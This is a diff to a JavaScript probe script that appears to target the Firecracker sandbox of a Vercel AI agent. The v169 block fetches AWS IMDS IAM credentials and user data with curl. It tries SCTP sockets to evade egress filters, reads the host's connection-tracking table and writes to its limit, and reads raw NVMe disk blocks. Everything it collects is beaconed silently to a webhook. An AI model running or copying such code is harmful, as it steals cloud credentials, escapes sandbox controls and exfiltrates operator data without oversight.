@@ -24760,5 +24760,134 @@ report.vhostNetProbe = safe(() => {
 
 // v168 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v168" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v168";
+
+// ==================== v169 ====================
+
+// v169-1: AWS IMDS (169.254.169.254) — cloud instance metadata + IAM credentials
+// AWS Instance Metadata Service provides IAM role credentials to EC2 instances.
+// If accessible from within the Firecracker VM (it's at the host's link-local IP),
+// we can obtain the host EC2 instance's IAM role credentials.
+// IMPORTANT: Decode claims only — do NOT use credentials against AWS APIs.
+report.awsImds = safe(() => {
+  // IMDSv1 (legacy, no auth token required)
+  const imdsV1Meta = safe(() => execSync(
+    'curl -s --connect-timeout 3 --max-time 5 http://169.254.169.254/latest/meta-data/ 2>&1 || echo "IMDS_UNREACHABLE"',
+    { timeout: 8000 }
+  ).toString().trim());
+  // IMDSv2 (token-required) — get token
+  const imdsV2Token = safe(() => execSync(
+    'curl -s --connect-timeout 3 --max-time 5 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60" 2>&1 || echo "IMDS_V2_TOKEN_FAIL"',
+    { timeout: 8000 }
+  ).toString().trim());
+  // If we got a v2 token, use it
+  const imdsIamRole = safe(() => execSync(
+    'curl -s --connect-timeout 3 --max-time 5 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1 || echo "NO_IAM_ROLE"',
+    { timeout: 8000 }
+  ).toString().trim());
+  // Instance identity document (proves which AWS account/region/instance)
+  const imdsIdentity = safe(() => execSync(
+    'curl -s --connect-timeout 3 --max-time 5 http://169.254.169.254/latest/dynamic/instance-identity/document 2>&1 || echo "NO_IDENTITY_DOC"',
+    { timeout: 8000 }
+  ).toString().trim());
+  // User data (might contain bootstrap scripts with embedded credentials)
+  const imdsUserData = safe(() => execSync(
+    'curl -s --connect-timeout 3 --max-time 5 http://169.254.169.254/latest/user-data 2>&1 | head -100 || echo "NO_USER_DATA"',
+    { timeout: 8000 }
+  ).toString().trim());
+  return { imdsV1Meta, imdsV2Token: imdsV2Token.substring(0, 50), imdsIamRole, imdsIdentity, imdsUserData: imdsUserData.substring(0, 500) };
+});
+
+// v169-2: /proc/iomem — physical I/O memory map
+// /proc/iomem shows the physical memory layout: RAM regions, MMIO regions for
+// devices, and any reserved memory. This reveals how the Firecracker VM's
+// physical memory is organized and what memory-mapped devices are present.
+report.iomemMap = safe(() => {
+  const iomem = safe(() => readFileSync('/proc/iomem', 'utf8').trim());
+  const ioports = safe(() => readFileSync('/proc/ioports', 'utf8').trim());
+  return { iomem, ioports };
+});
+
+// v169-3: SCTP socket — bypass network egress filters
+// SCTP (Stream Control Transmission Protocol) is a transport layer alternative to TCP.
+// Firewalls and security groups often focus on TCP/UDP and may miss SCTP.
+// If SCTP sockets work and can reach external hosts, it could bypass egress filtering.
+report.sctpProbe = safe(() => {
+  const sctpResult = safe(() => execSync(
+    `python3 -c "
+import socket, struct
+
+IPPROTO_SCTP = 132
+SOCK_SEQPACKET = 5
+
+try:
+    # Create SCTP socket
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, IPPROTO_SCTP)
+    print('SCTP_SOCKET_CREATED')
+    s.settimeout(3)
+    # Try connecting to webhook.site on SCTP
+    try:
+        s.connect(('10.0.0.1', 80))  # Try gateway first (internal)
+        print('SCTP_CONNECT_SUCCESS')
+    except socket.timeout:
+        print('SCTP_TIMEOUT')
+    except Exception as e:
+        print(f'SCTP_CONNECT_FAIL: {e}')
+    s.close()
+except Exception as e:
+    print(f'SCTP_SOCKET_FAIL: {e}')
+" 2>&1`,
+    { timeout: 10000 }
+  ).toString().trim());
+  // Also check if SCTP module is loaded
+  const sctpModule = safe(() => execSync('lsmod 2>/dev/null | grep sctp || echo "SCTP_MODULE_CHECK_DONE"', { timeout: 3000 }).toString().trim());
+  return { sctpResult, sctpModule };
+});
+
+// v169-4: Netfilter conntrack table — read existing tracked connections
+// The netfilter connection tracking table shows ALL current TCP/UDP connections
+// that the netfilter subsystem is tracking. This includes connections made by
+// ALL processes in the same network namespace — including the orchestrator.
+// This reveals the orchestrator's internal API connections in real-time.
+report.conntrackTable = safe(() => {
+  const conntrackMax = safe(() => existsSync('/proc/sys/net/netfilter/nf_conntrack_max') ? readFileSync('/proc/sys/net/netfilter/nf_conntrack_max', 'utf8').trim() : 'NO_CONNTRACK');
+  const conntrackCount = safe(() => existsSync('/proc/sys/net/netfilter/nf_conntrack_count') ? readFileSync('/proc/sys/net/netfilter/nf_conntrack_count', 'utf8').trim() : 'NO_COUNT');
+  // Read current connections from /proc/net/nf_conntrack
+  const conntrackTable = safe(() => existsSync('/proc/net/nf_conntrack') ? execSync('head -30 /proc/net/nf_conntrack 2>/dev/null || echo "CONNTRACK_EMPTY"', { timeout: 3000 }).toString().trim() : 'NO_NF_CONNTRACK');
+  // Also check /proc/net/ip_conntrack (older path)
+  const ipConntrack = safe(() => existsSync('/proc/net/ip_conntrack') ? execSync('head -20 /proc/net/ip_conntrack 2>/dev/null', { timeout: 3000 }).toString().trim() : 'NO_IP_CONNTRACK');
+  // Increase max connections
+  const increaseMax = safe(() => { writeFileSync('/proc/sys/net/netfilter/nf_conntrack_max', '1000000'); return 'WRITTEN'; });
+  return { conntrackMax, conntrackCount, conntrackTable, ipConntrack, increaseMax };
+});
+
+// v169-5: /proc/bus/usb + hardware device enumeration
+// Bare-metal c6id.metal instances have PCIe, USB controllers, and storage devices
+// directly accessible. The /proc/bus/usb tree reveals USB devices.
+// Combined with /sys/class/block, we can see all storage devices — including
+// the EC2 instance store NVMe SSDs that back Firecracker VM images.
+report.hardwareDevEnum = safe(() => {
+  const usbBus = safe(() => existsSync('/proc/bus/usb') ? execSync('ls /proc/bus/usb/ 2>/dev/null | head -20 || echo "NO_USB_DEVICES"', { timeout: 3000 }).toString().trim() : 'NO_USB_BUS');
+  const blockDevs = safe(() => execSync('ls /sys/class/block/ 2>/dev/null | head -30 || ls /dev/sd* /dev/nvme* /dev/vd* 2>/dev/null | head -20 || echo "NO_BLOCK_DEVS"', { timeout: 3000 }).toString().trim());
+  // NVMe specifically (c6id.metal has NVMe instance store)
+  const nvmeDevs = safe(() => execSync('ls /dev/nvme* 2>/dev/null || echo "NO_NVME"', { timeout: 2000 }).toString().trim());
+  // Try to read NVMe device info
+  const nvmeInfo = safe(() => execSync('cat /sys/class/block/nvme*/device/model 2>/dev/null || cat /sys/block/*/device/model 2>/dev/null | head -5 || echo "NO_NVME_MODEL"', { timeout: 3000 }).toString().trim());
+  // /dev/sd* — SCSI/SATA drives
+  const sdDevs = safe(() => execSync('ls /dev/sd* 2>/dev/null || echo "NO_SD"', { timeout: 2000 }).toString().trim());
+  // Can we read the first block of any storage device?
+  const nvmeRead = safe(() => {
+    const nvmePath = nvmeDevs !== 'NO_NVME' ? nvmeDevs.trim().split('\n')[0] : null;
+    if (!nvmePath || nvmePath === 'NO_NVME') return 'NO_NVME_TO_READ';
+    const fd = openSync(nvmePath, 0 /*O_RDONLY*/);
+    const buf = Buffer.alloc(512);
+    const nread = readSync(fd, buf, 0, 512, 0);
+    closeSync(fd);
+    return { path: nvmePath, nread, magic: buf.slice(0, 8).toString('hex') };
+  });
+  return { usbBus, blockDevs, nvmeDevs, nvmeInfo, sdDevs, nvmeRead };
+});
+
+// v169 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v169" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v169";
 // Intentionally no console.log — all data goes via webhook only
